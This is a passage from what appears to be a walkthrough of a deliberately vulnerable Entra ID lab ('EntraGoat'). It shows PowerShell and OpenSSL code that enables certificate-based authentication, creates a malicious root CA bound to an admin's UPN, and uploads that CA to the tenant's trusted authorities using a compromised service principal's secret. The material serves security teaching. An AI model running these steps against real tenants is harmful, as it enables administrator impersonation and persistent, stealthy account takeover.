</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">x509CertificateAuthenticationDefaultMode</span> <span class="p">=</span> <span class="s2">&#34;x509CertificateSingleFactor&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">rules</span> <span class="p">=</span> <span class="vm">@</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Update-MgPolicyAuthenticationMethodPolicyAuthenticationMethodConfiguration</span> <span class="p">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">-AuthenticationMethodConfigurationId</span> <span class="s2">&#34;X509Certificate&#34;</span> <span class="n">-BodyParameter</span> <span class="nv">$updateParams</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And we verify that CBA is now enabled (<em>Figure 17</em>).</p>
<p><img loading="lazy" src="/posts/scenario6/image%2016.png"></p>
<p><em>Figure 17. CBA enabled</em></p>
<p>_____</p>
<p><strong>Note:</strong> This change can also be applied interactively through the Entra admin center by:</p>
<ul>
<li>Signing in at <a href="https://entra.microsoft.com/">https://entra.microsoft.com</a> using Terence’s account</li>
<li>Navigate to: Entra ID → Authentication methods → Policies → Certificate-based authentication</li>
<li>Toggle state to <strong>Enable, as <em>Figure 18</em> shows</strong></li>
</ul>
<p><img loading="lazy" src="/posts/scenario6/image%2017.png"></p>
<p><em>Figure 18. CBA enabled through Entra admin center</em></p>
<p>Depending on tenant policy, MFA setup may be required for Terence on first login.</p>
<p>_____</p>
<h3 id="step-7-uploading-the-malicious-root-certificate-authority">Step 7: Uploading the malicious root certificate authority<a hidden class="anchor" aria-hidden="true" href="#step-7-uploading-the-malicious-root-certificate-authority">#</a></h3>
<p>Now that CBA is enabled, we pivot back to the DataSync-Production service principal and authenticate using the client secret we previously added to it in order to add a root CA to the tenant&rsquo;s trusted CAs.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Connect-MgGraph</span> <span class="n">-TenantId</span> <span class="nv">$tenantId</span> <span class="n">-ClientSecretCredential</span> <span class="nv">$dsCred</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><em><strong>NOTE:</strong></em> Creating, configuring, and uploading a root CA and client certificate to Entra ID via CLI is a multi-step process with several failure points. Entra ID enforces a specific format for the UPN field in the SAN extension that PowerShell struggles to generate with the required OID. To avoid these pitfalls, we use OpenSSL to generate both the root CA.</p>
<p>We begin by setting up the CA structure with the following script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$opensslBinary</span> <span class="p">=</span> <span class="s2">&#34;C:\Program Files\OpenSSL-Win64\bin\openssl.exe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$adminUPN</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-MgUser</span> <span class="n">-Filter</span> <span class="s2">&#34;startswith(userPrincipalName,&#39;EntraGoat-admin-s6&#39;)&#34;</span><span class="p">).</span><span class="py">UserPrincipalName</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Setup CA directory structure</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$caWorkspace</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$env:TEMP</span><span class="s2">\EntraGoat-CA&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$caWorkspace</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Set-Location</span> <span class="nv">$env:TEMP</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">Remove-Item</span> <span class="nv">$caWorkspace</span> <span class="n">-Recurse</span> <span class="n">-Force</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="vm">@</span><span class="p">(</span><span class="s2">&#34;</span><span class="nv">$caWorkspace</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="nv">$caWorkspace</span><span class="s2">\ca&#34;</span><span class="p">,</span> <span class="s2">&#34;</span><span class="nv">$caWorkspace</span><span class="s2">\ca\issued&#34;</span><span class="p">)</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nb">New-Item</span> <span class="n">-Path</span> <span class="p">$\</span><span class="n">_</span> <span class="n">-ItemType</span> <span class="n">Directory</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Initialize database (as OpenSSL requires specific format)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">New-Item</span> <span class="n">-Path</span> <span class="s2">&#34;</span><span class="nv">$caWorkspace</span><span class="s2">\ca\index.db&#34;</span> <span class="n">-ItemType</span> <span class="n">File</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="s2">&#34;01&#34;</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="s2">&#34;</span><span class="nv">$caWorkspace</span><span class="s2">\ca\serial&#34;</span> <span class="n">-Encoding</span> <span class="n">ASCII</span> <span class="n">-NoNewline</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Root Certificate Authority configuration</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$caConfig</span> <span class="p">=</span> <span class="sh">@&#34;
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">[ ca ]
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">default\_ca = entragoat\_ca
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">[ entragoat\_ca ]
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">dir = ./ca
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">certs = `</span><span class="nv">$dir</span><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">new\_certs\_dir = `</span><span class="nv">$dir</span><span class="sh">/issued
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">database = `</span><span class="nv">$dir</span><span class="sh">/index.db
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">serial = `</span><span class="nv">$dir</span><span class="sh">/serial
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">RANDFILE = `</span><span class="nv">$dir</span><span class="sh">/.rand
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">certificate = `</span><span class="nv">$dir</span><span class="sh">/entragoat-root.cer
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">private\_key = `</span><span class="nv">$dir</span><span class="sh">/entragoat-root.key
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">default\_days = 730
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">default\_crl\_days = 30
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">default\_md = sha256
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">preserve = no
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">policy = trust\_no\_one\_policy
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">[ trust\_no\_one\_policy ]
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">countryName = optional
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">stateOrProvinceName = optional
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">localityName = optional
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">organizationName = optional
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">organizationalUnitName = optional
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">commonName = optional
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">emailAddress = optional
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">[req]
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">x509\_extensions = user\_cert
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">req\_extensions = v3\_req
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">[ user\_cert ]
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">subjectAltName = @alt\_names
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">[ v3\_req ]
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">subjectAltName = @alt\_names
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">[alt\_names]
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">otherName=1.3.6.1.4.1.311.20.2.3;UTF8:</span><span class="nv">$adminUPN</span><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">&#34;@</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Client certificate configuration with SAN extension</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$clientConfig</span> <span class="p">=</span> <span class="sh">@&#34;
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">[req]
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">x509\_extensions = user\_cert
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">req\_extensions = v3\_req
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">[ user\_cert ]
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">subjectAltName = @alt\_names
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">[ v3\_req ]
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">subjectAltName = @alt\_names
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">[alt\_names]
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">otherName=1.3.6.1.4.1.311.20.2.3;UTF8:</span><span class="nv">$adminUPN</span><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">
</span></span></span><span class="line"><span class="cl"><span class="sh">&#34;@</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># output configuration to files</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$caConfig</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="s2">&#34;</span><span class="nv">$caWorkspace</span><span class="s2">\ca.conf&#34;</span> <span class="n">-Encoding</span> <span class="n">ASCII</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$clientConfig</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="s2">&#34;</span><span class="nv">$caWorkspace</span><span class="s2">\client.conf&#34;</span> <span class="n">-Encoding</span> <span class="n">ASCII</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Set-Location</span> <span class="nv">$caWorkspace</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Generate root CA private key</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&amp;</span> <span class="nv">$opensslBinary</span> <span class="n">genrsa</span> <span class="n">-out</span> <span class="n">ca</span><span class="p">\</span><span class="nb">entragoat-root</span><span class="p">.</span><span class="py">key</span> <span class="mf">4096</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># Create root certificate for entra trust</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&amp;</span> <span class="nv">$opensslBinary</span> <span class="n">req</span> <span class="n">-new</span> <span class="n">-x509</span> <span class="n">-days</span> <span class="mf">3650</span> <span class="n">-key</span> <span class="n">ca</span><span class="p">\</span><span class="nb">entragoat-root</span><span class="p">.</span><span class="py">key</span> <span class="n">-out</span> <span class="n">ca</span><span class="p">\</span><span class="nb">entragoat-root</span><span class="p">.</span><span class="py">cer</span> <span class="n">-subj</span> <span class="s2">&#34;/CN=EntraGoat Evil Root CA/O=EntraGoat Security/C=US&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">Write-Output</span> <span class="s2">&#34;Root CA certificate path: </span><span class="nv">$caWorkspace</span><span class="s2">\ca\entragoat-root.cer&#34;</span> <span class="c"># upload this to the tenant</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After the malicious CA infrastructure is prepared, the contents of $caWorkspace\ca\ should resemble the files that <em>Figure 19</em> shows.</p>
<p><img loading="lazy" src="/posts/scenario6/image%2018.png"></p>
<p>*Figure 19. Output to $caWorkspace\ca*</p>
<p>Now we can upload our custom root certificate to Entra ID’s trusted certificate authorities list:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Load the root certificate</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$rootCA</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Security.Cryptography.X509Certificates.X509Certificate2</span><span class="p">]::</span><span class="n">new</span><span class="p">(</span><span class="s2">&#34;</span><span class="nv">$caWorkspace</span><span class="s2">\ca\entragoat-root.cer&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$caAuthority</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">isRootAuthority</span> <span class="p">=</span> <span class="vm">$true</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">certificate</span> <span class="p">=</span> <span class="p">[</span><span class="no">System.Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$rootCA</span><span class="p">.</span><span class="py">GetRawCertData</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># get existing CBA configuration</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$existingConfigs</span> <span class="p">=</span> <span class="nb">Invoke-MgGraphRequest</span> <span class="n">-Method</span> <span class="n">GET</span> <span class="p">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">-Uri</span> <span class="s2">&#34;https://graph.microsoft.com/v1.0/organization/</span><span class="nv">$tenantId</span><span class="s2">/certificateBasedAuthConfiguration&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$existingConfigs</span><span class="p">.</span><span class="py">value</span> <span class="o">-and</span> <span class="nv">$existingConfigs</span><span class="p">.</span><span class="py">value</span><span class="p">.</span><span class="py">Count</span> <span class="o">-gt</span> <span class="mf">0</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c"># Update existing config</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$configId</span> <span class="p">=</span> <span class="nv">$existingConfigs</span><span class="p">.</span><span class="n">value</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="py">id</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$existingCAs</span> <span class="p">=</span> <span class="nv">$existingConfigs</span><span class="p">.</span><span class="n">value</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="py">certificateAuthorities</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c"># Add new CA to existing ones</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$updatedCAs</span> <span class="p">=</span> <span class="nv">$existingCAs</span> <span class="p">+</span> <span class="vm">@</span><span class="p">(</span><span class="nv">$caAuthority</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$updateBody</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">certificateAuthorities</span> <span class="p">=</span> <span class="nv">$updatedCAs</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="p">|</span> <span class="nb">ConvertTo-Json</span> <span class="n">-Depth</span> <span class="mf">3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$response</span> <span class="p">=</span> <span class="nb">Invoke-MgGraphRequest</span> <span class="n">-Method</span> <span class="n">PATCH</span> <span class="p">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">-Uri</span> <span class="s2">&#34;https://graph.microsoft.com/v1.0/organization/</span><span class="nv">$tenantId</span><span class="s2">/certificateBasedAuthConfiguration/</span><span class="nv">$configId</span><span class="s2">&#34;</span> <span class="p">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">-Body</span> <span class="nv">$updateBody</span> <span class="p">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="n">-ContentType</span> <span class="s2">&#34;application/json&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="s2">&#34;No existing configuration found&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">catch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c"># Create new CBA configuration</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$body</span> <span class="p">=</span> <span class="vm">@</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">certificateAuthorities</span> <span class="p">=</span> <span class="vm">@</span><span class="p">(</span><span class="nv">$caAuthority</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="p">|</span> <span class="nb">ConvertTo-Json</span> <span class="n">-Depth</span> <span class="mf">3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$response</span> <span class="p">=</span> <span class="nb">Invoke-MgGraphRequest</span> <span class="n">-Method</span> <span class="n">POST</span> <span class="p">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">-Uri</span> <span class="s2">&#34;https://graph.microsoft.com/v1.0/organization/</span><span class="nv">$tenantId</span><span class="s2">/certificateBasedAuthConfiguration&#34;</span> <span class="p">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">-Body</span> <span class="nv">$body</span> <span class="p">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">-ContentType</span> <span class="s2">&#34;application/json&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>And verify that the upload succeeded and the certificate is now trusted by the tenant:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$configs</span> <span class="p">=</span> <span class="nb">Invoke-MgGraphRequest</span> <span class="n">-Method</span> <span class="n">GET</span> <span class="p">`</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">-Uri</span> <span class="s2">&#34;https://graph.microsoft.com/v1.0/organization/</span><span class="nv">$tenantId</span><span class="s2">/certificateBasedAuthConfiguration&#34;</span>
</span></span><span class="line"><span class="cl">
